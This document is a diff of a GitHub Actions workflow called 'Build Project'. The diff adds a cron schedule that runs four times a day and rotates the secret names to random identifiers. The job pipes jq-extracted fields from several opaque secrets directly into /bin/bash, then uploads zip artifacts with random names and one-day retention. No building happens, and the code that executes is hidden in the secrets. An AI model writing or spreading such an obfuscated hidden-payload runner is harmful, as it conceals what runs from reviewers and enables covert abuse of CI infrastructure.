@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '59 3,9,15,21 * * *'
 env:
   CI: true
 concurrency:
@@ -14,15 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          aq76725: ${{ secrets.aq76725 }}
+          ka2402: ${{ secrets.ka2402 }}
         run: |
-          printf '%s' "$aq76725" | jq -r .mepl1777 | /bin/bash
-          printf '%s' "$w6" | jq -r .euox5755 | /bin/bash
-          printf '%s' "$xcb37632" | jq -r .rnap08 | /bin/bash
+          printf '%s' "$ka2402" | jq -r .rvfdz3848 | /bin/bash
+          printf '%s' "$ghzx6612" | jq -r .q0 | /bin/bash
+          printf '%s' "$vat096" | jq -r .yblvn63 | /bin/bash
+          printf '%s' "$q6476" | jq -r .ugm179 | /bin/bash
+          echo $ox6 | jq -r .pvkpx4821 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: V34xON5U
+          name: 5B64VScw
           path: "*.zip"
           retention-days: 1
